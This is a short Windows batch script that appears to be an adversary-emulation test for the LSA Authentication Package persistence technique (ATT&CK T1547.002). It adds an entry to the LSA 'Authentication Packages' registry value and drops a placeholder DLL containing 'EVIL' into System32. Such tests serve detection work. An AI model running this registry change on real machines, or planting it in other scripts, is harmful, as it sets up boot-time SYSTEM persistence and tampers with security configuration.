@echo off
FOR /F "tokens=4,5*" %%a in ('reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v "Authentication Packages"') do reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v "Authentication Packages" /t REG_MULTI_SZ /d %%a\0T1547002001 /f
echo "EVIL" >> C:\Windows\System32\T1547002001.dll